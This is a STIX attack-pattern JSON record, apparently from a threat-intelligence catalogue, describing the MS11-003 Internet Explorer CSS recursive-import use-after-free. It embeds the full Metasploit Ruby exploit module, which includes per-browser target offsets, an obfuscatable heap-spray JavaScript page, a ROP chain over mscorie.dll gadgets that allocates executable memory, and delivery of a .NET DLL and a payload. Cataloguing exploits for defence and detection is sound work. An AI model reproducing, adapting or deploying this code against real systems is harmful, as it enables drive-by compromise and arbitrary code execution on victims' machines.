{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--096b2de6-5452-47b6-a943-531f3611681e",
    "created": "2024-08-14T16:40:23.278028Z",
    "modified": "2024-08-14T16:40:23.278032Z",
    "name": "MS11-003 Microsoft Internet Explorer CSS Recursive Import Use After Free",
    "description": " This module exploits a memory corruption vulnerability within Microsoft\\'s HTML engine (mshtml). When parsing an HTML page containing a recursive CSS import, a C++ object is deleted and later reused. This leads to arbitrary code execution.  This exploit utilizes a combination of heap spraying and the .NET 2.0 'mscorie.dll' module to bypass DEP and ASLR. This module does not opt-in to ASLR. As such, this module should be reliable on all Windows versions with .NET 2.0.50727 installed.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms11_003_ie_css_import.rb",
            "external_id": "ms11_003_ie_css_import.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-3971"
        },
        {
            "source_name": "reference",
            "url": "http://www.wooyun.org/bugs/wooyun-2010-0885"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2010/Dec/110"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking # Need more love for Great\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #  :ua_name    => HttpClients::IE,\n  #  :ua_minver  => \"7.0\", # Should be 6\n  #  :ua_maxver  => \"8.0\",\n  #  :javascript => true,\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  # Not strictly a vuln check, but an exploitability check since a\n  #  # specific version of .NET is required to make the ROP work.\n  #  :vuln_test  => \"if (/.NET CLR 2\\\\.0\\\\.50727/.test(navigator.userAgent)) { is_vuln = true }else{ is_vuln = false }\",\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS11-003 Microsoft Internet Explorer CSS Recursive Import Use After Free',\n      'Description'    => %q{\n          This module exploits a memory corruption vulnerability within Microsoft\\'s\n        HTML engine (mshtml). When parsing an HTML page containing a recursive CSS\n        import, a C++ object is deleted and later reused. This leads to arbitrary\n        code execution.\n\n        This exploit utilizes a combination of heap spraying and the\n        .NET 2.0 'mscorie.dll' module to bypass DEP and ASLR. This module does not\n        opt-in to ASLR. As such, this module should be reliable on all Windows\n        versions with .NET 2.0.50727 installed.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'passerby',       # Initial discovery / report\n          'd0c_s4vage',     # First working public exploit\n          'jduck'           # Metasploit module (ROP, @WTFuzz spray)\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-3971' ],\n          [ 'OSVDB', '69796' ],\n          [ 'BID', '45246' ],\n          [ 'URL', 'http://www.wooyun.org/bugs/wooyun-2010-0885' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2010/Dec/110' ],\n          [ 'MSB', 'MS11-003' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n          'DisableNops'   => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n\n          [ 'Internet Explorer 8',\n            {\n              'Ret' => 0x105ae020,\n              'OnePtrOff' => 0x18,\n              'DerefOff' => 0x30,\n              'FlagOff' => 0x54,\n              'CallDeref1' => 0x20,\n              'SignedOff' => 0x1c,\n              'CallDeref2' => 0x24,\n              'CallDeref3' => 0x00,\n              'CallDeref4' => 0x20,\n              'Deref4Off' => 0x08\n            }\n          ],\n\n          [ 'Internet Explorer 7',\n            {\n              'Ret' => 0x105ae020,\n              'OnePtrOff' => 0x14,\n              'DerefOff' => 0x5c,\n              'FlagOff' => 0x34,\n              'CallDeref1' => 0x1c,\n              'SignedOff' => 0x18,\n              'CallDeref2' => 0x20,\n              'CallDeref3' => 0x00,\n              'CallDeref4' => 0x20,\n              'Deref4Off' => 0x08\n            }\n          ],\n\n          # For now, treat the IE6 target the same as the debug target.\n          [ 'Internet Explorer 6',\n            {\n              'Ret' => 0xc0c0c0c0,\n              'OnePtrOff' => 0x14,\n              'DerefOff' => 0x5c,\n              'FlagOff' => 0x34,\n              'CallDeref1' => 0x1c,\n              'SignedOff' => 0x18,\n              'CallDeref2' => 0x20,\n              'CallDeref3' => 0x00,\n              'CallDeref4' => 0x20,\n              'Deref4Off' => 0x08\n            }\n          ],\n\n          [ 'Debug Target (Crash)',\n            {\n              'Ret' => 0xc0c0c0c0,\n              'OnePtrOff' => 0,\n              'DerefOff' => 4,\n              'FlagOff' => 8,\n              'CallDeref1' => 0xc,\n              'SignedOff' => 0x10,\n              'CallDeref2' => 0x14,\n              'CallDeref3' => 0x18,\n              'CallDeref4' => 0x1c,\n              'Deref4Off' => 0x20\n            }\n          ]\n        ],\n      # Full-disclosure post was Dec 8th, original blog Nov 29th\n      'DisclosureDate' => '2010-11-29',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', true])\n      ])\n  end\n\n\n  def auto_target(cli, request)\n    mytarget = nil\n\n    agent = request.headers['User-Agent']\n    if agent =~ /MSIE 6\\.0/\n      mytarget = targets[3]\n    elsif agent =~ /MSIE 7\\.0/\n      mytarget = ua_has_clr(cli,agent) ? targets[2] : nil\n    elsif agent =~ /MSIE 8\\.0/\n      mytarget = ua_has_clr(cli,agent) ? targets[1] : nil\n    else\n      print_error(\"Unknown User-Agent #{agent}\")\n    end\n    mytarget\n  end\n\n  def ua_has_clr(cli, agent)\n    if agent =~ /\\.NET CLR 2\\.0\\.50727/\n      return true\n    end\n    print_error(\"Target machine does not have the .NET CLR 2.0.50727\")\n    false\n  end\n\n\n  def on_request_uri(cli, request)\n\n    print_status(\"Received request for %s\" % request.uri.inspect)\n\n    mytarget = target\n    if target.name == 'Automatic'\n      mytarget = auto_target(cli, request)\n      if (not mytarget)\n        send_not_found(cli)\n        return\n      end\n    end\n\n    #print_status(\"Automatically selected target: #{mytarget.name}\")\n\n    buf_addr = mytarget.ret\n    css_name = [buf_addr].pack('V') * (16 / 4)\n\n    # We stick in a placeholder string to replace after UTF-16 encoding\n    placeholder = \"a\" * (css_name.length / 2)\n    uni_placeholder = Rex::Text.to_unicode(placeholder)\n\n    if request.uri == get_resource() or request.uri =~ /\\/$/\n      print_status(\"Sending redirect\")\n\n      redir = get_resource()\n      redir << '/' if redir[-1,1] != '/'\n      redir << rand_text_alphanumeric(4+rand(4))\n      redir << '.html'\n      send_redirect(cli, redir)\n\n    elsif request.uri =~ /\\.html?$/\n      # Re-generate the payload\n      return if ((p = regenerate_payload(cli)) == nil)\n\n      print_status(\"Sending HTML\")\n\n      # Generate the ROP payload\n      rvas = rvas_mscorie_v2()\n      rop_stack = generate_rop(buf_addr, rvas)\n      fix_esp = rva2addr(rvas, 'leave / ret')\n      ret     = rva2addr(rvas, 'ret')\n      pivot1  = rva2addr(rvas, 'call [ecx+4] / xor eax, eax / pop ebp / ret 8')\n      pivot2  = rva2addr(rvas, 'xchg eax, esp / mov eax, [eax] / mov [esp], eax / ret')\n\n      # Append the payload to the rop_stack\n      rop_stack << p.encoded\n\n      # Build the deref-fest buffer\n      len = 0x84 + rop_stack.length\n      special_sauce = rand_text_alpha(len)\n\n      # This ptr + off must contain 0x00000001\n      special_sauce[mytarget['OnePtrOff'], 4] = [1].pack('V')\n\n      # Pointer that is dereferenced to get the flag\n      special_sauce[mytarget['DerefOff'], 4] = [buf_addr].pack('V')\n\n      # Low byte must not have bit 1 set\n      no_bit1 = rand(0xff) & ~2\n      special_sauce[mytarget['FlagOff'], 1] = [no_bit1].pack('V')\n\n      # These are deref'd to figure out what to call\n      special_sauce[mytarget['CallDeref1'], 4] = [buf_addr].pack('V')\n      special_sauce[mytarget['CallDeref2'], 4] = [buf_addr].pack('V')\n      special_sauce[mytarget['CallDeref3'], 4] = [buf_addr + mytarget['Deref4Off']].pack('V')\n      # Finally, this one becomes eip\n      special_sauce[mytarget['CallDeref4'] + mytarget['Deref4Off'], 4] = [pivot1].pack('V')\n\n      # This byte must be signed (shorter path to flow control)\n      signed_byte = rand(0xff) | 0x80\n      special_sauce[mytarget['SignedOff'], 1] = [signed_byte].pack('C')\n\n      # These offsets become a fix_esp ret chain ..\n      special_sauce[0x04, 4] = [pivot2].pack('V')    # part two of our stack pivot!\n      special_sauce[0x0c, 4] = [buf_addr + 0x84 - 4].pack('V')  # becomes ebp, for fix esp\n      special_sauce[0x10, 4] = [fix_esp].pack('V')   # our stack pivot ret's to this (fix_esp, from eax)\n\n      # Add in the rest of the ROP stack\n      special_sauce[0x84, rop_stack.length] = rop_stack\n\n      # Format for javascript use\n      special_sauce = Rex::Text.to_unescape(special_sauce)\n\n      js_function  = rand_text_alpha(rand(100)+1)\n\n      # Construct the javascript\n      custom_js = <<-EOS\nfunction #{js_function}() {\nheap = new heapLib.ie(0x20000);\nvar heapspray = unescape(\"#{special_sauce}\");\nwhile(heapspray.length < 0x1000) heapspray += unescape(\"%u4444\");\nvar heapblock = heapspray;\nwhile(heapblock.length < 0x40000) heapblock += heapblock;\nfinalspray = heapblock.substring(2, 0x40000 - 0x21);\nfor(var counter = 0; counter < 500; counter++) { heap.alloc(finalspray); }\nvar vlink = document.createElement(\"link\");\nvlink.setAttribute(\"rel\", \"Stylesheet\");\nvlink.setAttribute(\"type\", \"text/css\");\nvlink.setAttribute(\"href\", \"#{placeholder}\")\ndocument.getElementsByTagName(\"head\")[0].appendChild(vlink);\n}\nEOS\n      opts = {\n        'Symbols' => {\n          'Variables' => %w{ heapspray vlink heapblock heap finalspray counter },\n          'Methods'   => %w{ prepare }\n        }\n      }\n\n      if datastore['OBFUSCATE']\n        custom_js = ::Rex::Exploitation::ObfuscateJS.new(custom_js, opts)\n      end\n\n      js = heaplib(custom_js)\n\n      dll_uri = get_resource()\n      dll_uri << '/' if dll_uri[-1,1] != '/'\n      dll_uri << \"generic-\" + Time.now.to_i.to_s + \".dll\"\n\n      # Construct the final page\n      html = <<-EOS\n<html>\n<head>\n<script language='javascript'>\n#{js}\n</script>\n</head>\n<body onload='#{js_function}()'>\n<object classid=\"#{dll_uri}#GenericControl\">\n</body>\n</html>\nEOS\n      html = \"\\xff\\xfe\" + Rex::Text.to_unicode(html)\n      html.gsub!(uni_placeholder, css_name)\n\n      send_response(cli, html, { 'Content-Type' => 'text/html' })\n\n    elsif request.uri =~ /\\.dll$/\n      print_status(\"Sending .NET DLL\")\n\n      # Generate a .NET v2.0 DLL, note that it doesn't really matter what this contains since we don't actually\n      # use it's contents ...\n      ibase = (0x2000 | rand(0x8000)) << 16\n      dll = Msf::Util::EXE.to_dotnetmem(ibase, rand_text(16))\n\n      # Send a .NET v2.0 DLL down\n      send_response(cli, dll,\n        {\n          'Content-Type' => 'application/x-msdownload',\n          'Connection'   => 'close',\n          'Pragma'       => 'no-cache'\n        })\n\n    else\n      # Defines two different CSS import styles\n      import_styles = [\n        \"@import url(\\\"#{placeholder}\\\");\\n\",\n        \"@import \\\"#{placeholder}\\\";\\n\"\n      ]\n\n      # Choose four imports of random style\n      css = ''\n      4.times {\n        css << import_styles[rand(import_styles.length)]\n      }\n\n      css = \"\\xff\\xfe\" + Rex::Text.to_unicode(css)\n      css.gsub!(uni_placeholder, css_name)\n\n      print_status(\"Sending CSS\")\n\n      send_response(cli, css, { 'Content-Type' => 'text/css' })\n\n    end\n\n    # Handle the payload\n    handler(cli)\n\n  end\n\n  def rvas_mscorie_v2()\n    # mscorie.dll version v2.0.50727.3053\n    # Just return this hash\n    {\n      'call [ecx+4] / xor eax, eax / pop ebp / ret 8' => 0x237e,\n      'xchg eax, esp / mov eax, [eax] / mov [esp], eax / ret' => 0x575b,\n      'leave / ret'            => 0x25e5,\n      'ret'                    => 0x25e5+1,\n      'call [ecx] / pop ebp / ret 0xc' => 0x1ec4,\n      'pop eax / ret'          => 0x5ba1,\n      'pop ebx / ret'          => 0x54c0,\n      'pop ecx / ret'          => 0x1e13,\n      'pop esi / ret'          => 0x1d9a,\n      'pop edi / ret'          => 0x2212,\n      'mov [ecx], eax / mov al, 1 / pop ebp / ret 0xc' => 0x61f6,\n      'movsd / mov ebp, 0x458bffff / sbb al, 0x3b / ret' => 0x6154,\n    }\n  end\n\n  def generate_rop(buf_addr, rvas)\n    # ROP fun! (XP SP3 English, Dec 15 2010)\n    rvas.merge!({\n      # Instructions / Name    => RVA\n      'BaseAddress'            => 0x63f00000,\n      'imp_VirtualAlloc'       => 0x10f4\n    })\n\n    rop_stack = [\n      # Allocate an RWX memory segment\n      'pop ecx / ret',\n      'imp_VirtualAlloc',\n\n      'call [ecx] / pop ebp / ret 0xc',\n      0,         # lpAddress\n      0x1000,    # dwSize\n      0x3000,    # flAllocationType\n      0x40,      # flProt\n      :unused,\n\n      # Copy the original payload\n      'pop ecx / ret',\n      :unused,\n      :unused,\n      :unused,\n      :memcpy_dst,\n\n      'mov [ecx], eax / mov al, 1 / pop ebp / ret 0xc',\n      :unused,\n\n      'pop esi / ret',\n      :unused,\n      :unused,\n      :unused,\n      :memcpy_src,\n\n      'pop edi / ret',\n      0xdeadf00d # to be filled in above\n    ]\n    (0x200 / 4).times {\n      rop_stack << 'movsd / mov ebp, 0x458bffff / sbb al, 0x3b / ret'\n    }\n    # Execute the payload ;)\n    rop_stack << 'call [ecx] / pop ebp / ret 0xc'\n\n    rop_stack.map! { |e|\n      if e.kind_of? String\n        # Meta-replace (RVA)\n        fail_with(Failure::BadConfig, \"Unable to locate key: \\\"#{e}\\\"\") if not rvas[e]\n        rvas['BaseAddress'] + rvas[e]\n\n      elsif e == :unused\n        # Randomize\n        rand_text(4).unpack('V').first\n\n      elsif e == :memcpy_src\n        # Based on stack length..\n        buf_addr + 0x84 + (rop_stack.length * 4)\n\n      elsif e == :memcpy_dst\n        # Store our new memory ptr into our buffer for later popping :)\n        buf_addr + 0x84 + (21 * 4)\n\n      else\n        # Literal\n        e\n      end\n    }\n\n    rop_stack.pack('V*')\n  end\n\n  def rva2addr(rvas, key)\n    fail_with(Failure::BadConfig, \"Unable to locate key: \\\"#{key}\\\"\") if not rvas[key]\n    rvas['BaseAddress'] + rvas[key]\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-11-29",
    "x_mitre_platforms": [
        "win'"
    ]
}